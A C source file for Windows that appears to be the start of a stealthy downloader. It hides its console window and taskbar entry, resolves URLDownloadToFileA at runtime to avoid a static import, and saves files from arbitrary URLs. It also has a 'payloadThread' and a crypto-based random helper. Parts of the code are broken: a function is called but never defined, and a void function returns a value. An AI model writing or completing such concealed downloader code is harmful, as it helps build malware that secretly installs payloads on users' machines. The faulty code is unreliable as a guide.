#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wchar.h>
#include <stdio.h>

HCRYPTPROV prov = NULL;

DWORD WINAPI payloadThread(LPVOID lpParameter)
{
    int x = (int)lpParameter;
    showMsgBox();
    return 0;
}

int random()
{
    if (prov == NULL)
    {
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
        {
            ExitProcess(1);
        }
    }
    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
    return out & 0x7fffffff;
}

void hideWindow()
{
    HWND myWindow = GetConsoleWindow();
    ShowWindow(myWindow, SW_HIDE);
}

int hideAppInTaskbar(void)
{
    HWND hWnd;
    hWnd = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, SW_HIDE);
    return 0;
}

void downloadFile(char url[], char filename[])
{

    // WCHAR path[512];
    // SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path);

    // wcscat(path, L"\\hey");
    // wprintf(L"Path: %s\n", path);

    char buffer[512];

    HRESULT dl;

    typedef HRESULT(WINAPI * URLDownloadToFileA_t)(LPUNKNOWN pCaller, LPCSTR szURL, LPCSTR szFileName, DWORD dwReserved, void *lpfnCB);
    URLDownloadToFileA_t xURLDownloadToFileA;
    xURLDownloadToFileA = (URLDownloadToFileA_t)GetProcAddress(LoadLibraryA("urlmon"), "URLDownloadToFileA");

    dl = xURLDownloadToFileA(NULL, url, filename, 0, NULL);

    sprintf(buffer, "Downloading File From: %s, To: %s", url, filename);

    if (dl == S_OK)
    {
        sprintf(buffer, "File Successfully Downloaded To: %s", filename);
        printf(buffer);
    }
    else if (dl == E_OUTOFMEMORY)
    {
        sprintf(buffer, "Failed To Download File Reason: Insufficient Memory");
        printf(buffer);
        return 0;
    }
    else
    {
        sprintf(buffer, "Failed To Download File Reason: Unknown");
        printf(buffer);
        return 0;
    }
}
